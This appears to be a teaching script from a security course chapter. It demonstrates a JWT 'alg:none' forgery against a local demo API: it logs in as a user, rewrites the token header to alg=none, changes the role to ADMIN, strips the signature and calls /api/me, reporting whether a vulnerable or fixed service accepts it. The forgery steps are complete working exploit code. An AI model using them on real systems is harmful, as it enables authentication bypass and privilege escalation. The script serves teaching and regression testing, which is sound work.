#!/usr/bin/env bash
#
# Chapter 8 — JWT alg:none forgery
#
# 1. Login as alice (ROLE_USER)
# 2. Decode her JWT, replace alg=HS256 with alg=none, swap her role for ADMIN,
#    drop the signature, and re-encode
# 3. Hit GET /api/me with the forged token
#    - Vulnerable JwtService: returns admin profile (impersonation succeeded)
#    - Fixed JwtService:      returns 401

set -euo pipefail
API="${API:-http://localhost:8080}"

bold() { printf '\033[1m%s\033[0m\n' "$*"; }
gray() { printf '\033[90m%s\033[0m\n' "$*"; }

b64url() {
  python3 -c "import sys, base64, json; \
    s=sys.stdin.read(); \
    print(base64.urlsafe_b64encode(s.encode()).decode().rstrip('='))"
}
b64url_decode() {
  python3 -c "import sys, base64; \
    s=sys.stdin.read().strip(); \
    s += '='*(-len(s)%4); \
    print(base64.urlsafe_b64decode(s).decode())"
}

bold "[1/3] Login as alice@example.com"
LOGIN=$(curl -sS -X POST "${API}/api/auth/login" \
  -H 'Content-Type: application/json' \
  -d '{"email":"alice@example.com","password":"alice123!"}')
echo "  $LOGIN"
TOKEN=$(echo "$LOGIN" | python3 -c "import sys,json; print(json.load(sys.stdin)['token'])")
echo

bold "[2/3] Forge a token with alg=none and role=ADMIN"
HEADER='{"alg":"none","typ":"JWT"}'
PAYLOAD=$(echo "$TOKEN" | cut -d. -f2 | b64url_decode \
  | python3 -c "import sys,json; \
    p=json.load(sys.stdin); p['role']='ADMIN'; print(json.dumps(p, separators=(',',':')))")
gray "  Forged payload: $PAYLOAD"

NEW_HEADER=$(printf '%s' "$HEADER" | b64url)
NEW_PAYLOAD=$(printf '%s' "$PAYLOAD" | b64url)
FORGED="${NEW_HEADER}.${NEW_PAYLOAD}."
gray "  Forged token:   $FORGED"
echo

bold "[3/3] Hit /api/me with the forged token"
RESPONSE=$(curl -sS -o /tmp/resp.json -w '%{http_code}' \
  -H "Authorization: Bearer ${FORGED}" \
  "${API}/api/me")
echo "  HTTP ${RESPONSE}"
echo "  Body: $(cat /tmp/resp.json)"
echo

if [ "$RESPONSE" = "200" ] && grep -q '"role":"ADMIN"' /tmp/resp.json; then
  bold "ATTACK SUCCEEDED — server accepted alg=none and granted ADMIN."
  exit 1
else
  bold "ATTACK BLOCKED — fixed JwtService rejects unsigned tokens."
fi
